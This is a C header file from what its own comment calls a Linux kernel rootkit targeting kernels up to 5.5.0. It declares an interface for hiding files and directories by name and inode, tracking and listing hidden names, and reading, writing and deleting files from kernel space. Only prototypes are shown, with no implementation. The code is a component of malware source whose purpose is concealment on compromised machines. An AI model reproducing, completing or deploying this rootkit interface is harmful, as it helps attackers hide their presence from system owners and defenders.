/**
 * Linux Kernel version <= 5.5.0
 * - hash
 *
 *  ɯnɹpǝɹ rootkit
 */

#ifndef __FS_H
#define __FS_H

struct fs_file_node {
	unsigned long long ino;
	const char *filename;
};

bool fs_kern_path(const char *, struct path *);
bool fs_file_stat(struct path *, struct kstat *);
/**
 * Return hidden filename and inode number.
 * This function allocates data that must
 * be freed when no longer needed.
 */
struct fs_file_node *fs_get_file_node(const struct task_struct *);
bool fs_search_name(const char *, u64);
const char *fs_get_basename(const char *);
void fs_list_names(void);
int fs_add_name_ro(const char *, u64);
int fs_add_name_rw(const char *, u64);
int fs_add_name_rw_dir(const char *, u64, u64, bool);
bool fs_del_name(const char *);
void fs_names_cleanup(void);
struct fs_file_node *fs_load_fnode(struct file *);
struct file *fs_kernel_open_file(const char *);
u64 fs_get_parent_inode(struct path *);
int fs_is_dir_inode_hidden(u64 ino);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
ssize_t fs_kernel_write_file(struct file *, const void *, size_t, loff_t *);
ssize_t fs_kernel_read_file(struct file *, void *, size_t, loff_t *);
#else
ssize_t fs_kernel_write_file(struct file *, const char *, size_t, loff_t);
int fs_kernel_read_file(struct file *, loff_t, char *, unsigned long);
#endif

int fs_kernel_close_file(struct file *);
int fs_file_rm(char *);
#endif //__FS_H
